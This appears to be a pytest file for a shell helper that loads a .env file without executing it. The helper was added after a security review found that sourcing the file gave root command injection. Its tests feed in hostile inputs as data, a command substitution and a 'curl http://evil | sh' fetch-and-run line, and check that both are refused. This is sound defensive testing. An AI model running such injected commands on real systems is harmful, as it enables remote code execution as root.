"""`.env` is read, never sourced -- scripts/lib-core.sh's kp2_load_env.

`set -a; . "$PACK_DIR/.env"` does not assign, it EXECUTES: every line runs as
shell. join-api can write parts of the tree .env sits in and the host scripts
run as root on the droplet, so one appended `X=$(...)` was root on the host at
the next `scripts/console.sh status` (docs/security-review-2026-08-23.md,
finding H1). The whole point of the helper is that nothing in the file is
evaluated, so the tests that matter are: a command substitution is REFUSED
rather than run, and a legitimately awkward value still survives byte-exact.

The DSN case is not decoration either. `.env.example` and
infra/ci/db-sync-remote.sh both carry prose warnings about `&` backgrounding
the rest of an unquoted assignment; db-sync-remote.sh writes `KEY='value'`,
so stripping exactly one layer of single quotes is what keeps that key
working, not a nicety.
"""
from __future__ import annotations

import pathlib
import subprocess

PACK = pathlib.Path(__file__).resolve().parent.parent
LIB_CORE = PACK / "scripts" / "lib-core.sh"


def _load(env_text: str, *print_keys: str, tmp_path: pathlib.Path
          ) -> subprocess.CompletedProcess:
    """Source lib-core.sh, run kp2_load_env over env_text, print the keys.

    printenv, not `echo $VAR`: the helper must EXPORT, since every caller
    (lib-stack.sh, member.sh, join-store-export.sh) relies on the values
    reaching docker compose and other children."""
    env_file = tmp_path / ".env"
    env_file.write_text(env_text)
    script = (
        f'. "{LIB_CORE}"\n'
        f'kp2_load_env "{env_file}"\n'
        + "".join(f'printf "%s=[%s]\\n" {k} "$(printenv {k})"\n' for k in print_keys)
    )
    return subprocess.run(["bash", "-euo", "pipefail", "-c", script],
                          capture_output=True, text=True)


def test_a_command_substitution_is_refused_not_executed(tmp_path):
    canary = tmp_path / "pwned"
    proc = _load(f"X=$(touch {canary})\n", tmp_path=tmp_path)
    assert proc.returncode != 0, proc.stdout
    assert not canary.exists(), (
        "kp2_load_env EXECUTED the line -- the exact bug it exists to stop"
    )
    assert "line 1" in proc.stderr and "whitespace" in proc.stderr, proc.stderr


def test_a_quoted_dsn_round_trips_intact(tmp_path):
    dsn = "postgresql://u:p@h/db?a=1&b=2"
    proc = _load(f"KP2_JOIN_DB_URL='{dsn}'\n", "KP2_JOIN_DB_URL", tmp_path=tmp_path)
    assert proc.returncode == 0, proc.stderr
    assert proc.stdout == f"KP2_JOIN_DB_URL=[{dsn}]\n", proc.stdout


def test_comments_and_blank_lines_are_skipped(tmp_path):
    proc = _load(
        "# KP2 build pack -- secrets only.\n"
        "\n"
        "   \n"
        "  # indented comment\n"
        "XROAD_ADMIN_USER=xrd\n",
        "XROAD_ADMIN_USER", tmp_path=tmp_path,
    )
    assert proc.returncode == 0, proc.stderr
    assert proc.stdout == "XROAD_ADMIN_USER=[xrd]\n", proc.stdout


def test_an_unquoted_value_with_a_space_is_refused(tmp_path):
    """Sourcing `FOO=bar baz` runs `baz` with FOO=bar in its environment.
    There is no reading of that line this parser could safely guess at, so it
    refuses instead of exporting `bar` and dropping the rest."""
    proc = _load("FOO=bar baz\n", tmp_path=tmp_path)
    assert proc.returncode != 0
    assert "FOO" in proc.stderr and "whitespace" in proc.stderr, proc.stderr


def test_a_line_that_is_not_an_assignment_is_refused_not_skipped(tmp_path):
    """A skip is the silence an injected line wants: the file loads, the
    script carries on, and nobody looks. The refusal names the line."""
    proc = _load("XROAD_ADMIN_USER=xrd\ncurl http://evil | sh\n", tmp_path=tmp_path)
    assert proc.returncode != 0
    assert "line 2" in proc.stderr, proc.stderr


def test_the_packs_own_env_example_parses(tmp_path):
    """The shape gen-secrets.sh and .env.example actually produce -- comments,
    a quoted DSN in a comment, plain CHANGEME values -- must load cleanly, or
    this helper broke the pack rather than hardening it."""
    proc = _load((PACK / ".env.example").read_text(),
                 "XROAD_ADMIN_USER", tmp_path=tmp_path)
    assert proc.returncode == 0, proc.stderr
    assert proc.stdout == "XROAD_ADMIN_USER=[xrd]\n", proc.stdout


def test_a_missing_file_is_not_an_error(tmp_path):
    """lib-stack.sh's old `[ -f ... ] &&` guard said the same thing: a pack
    with no .env yet reaches gen-secrets.sh's refusal, not a parse error."""
    proc = subprocess.run(
        ["bash", "-euo", "pipefail", "-c",
         f'. "{LIB_CORE}"\nkp2_load_env "{tmp_path}/nope"\necho ok\n'],
        capture_output=True, text=True,
    )
    assert proc.returncode == 0 and proc.stdout.strip() == "ok", proc.stderr
